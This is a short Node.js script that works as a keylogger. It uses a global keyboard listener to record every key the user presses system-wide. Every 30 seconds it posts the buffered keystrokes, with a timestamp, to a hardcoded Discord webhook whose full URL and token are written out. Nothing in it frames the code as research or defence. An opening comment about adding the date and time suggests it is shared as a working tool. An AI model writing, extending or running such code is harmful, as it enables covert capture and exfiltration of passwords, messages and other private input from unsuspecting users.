// I added a Time and Date :)



const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios');

const v = new GlobalKeyboardListener();
let keystrokes = '';

// Function to get current date and time in a formatted string
function getCurrentDateTime() {
    const now = new Date();
    const dateString = now.toDateString();
    const timeString = now.toTimeString().split(' ')[0]; // Extract time part and remove timezone
    return `${dateString} ${timeString}`;
}

// Log every key that's pressed.
v.addListener(function (e) {
    if (e.state === "UP") {
        switch (e.name) {
            case 'SPACE':
                process.stdout.write(' ');
                keystrokes += ' ';
                break;
            case 'TAB':
                process.stdout.write('<TAB>');
                keystrokes += '<TAB>';
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keystrokes += '<ENTER>';
                break;
            default:
                process.stdout.write(e.name);
                keystrokes += e.name;
        }
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (
        e.state === "DOWN" &&
        e.name === "SPACE" &&
        (down["LEFT META"] || down["RIGHT META"])
    ) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.state === "DOWN" && e.name === "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Call one listener only once (demonstrating removeListener())
const calledOnce = function (e) {
    console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);

/* 
 To add logging of errors please use. This is hopefully not needed in most cases, but may still be useful in production.
    new GlobalKeyboardListener({
        windows: {
            onError: (errorCode) => console.error("ERROR: " + errorCode),
            onInfo: (info) => console.info("INFO: " + info)
        },
        mac: {
            onError: (errorCode) => console.error("ERROR: " + errorCode),
        }
    })
*/

setInterval(async () => {
    const dateTime = getCurrentDateTime();
    await axios.post('https://discord.com/api/webhooks/1232172582002753606/MkkZC8PFYY1QSLQ-p9fhj5kwDJ0jyyaxQPT2DlP-QYQLH_JCtpKrhWAMW_sS8axHywG4', {
        "content": `**${dateTime}**\n${keystrokes}`, // Add date and time before keystrokes
    });
    keystrokes = '';
}, 1000 * 30);
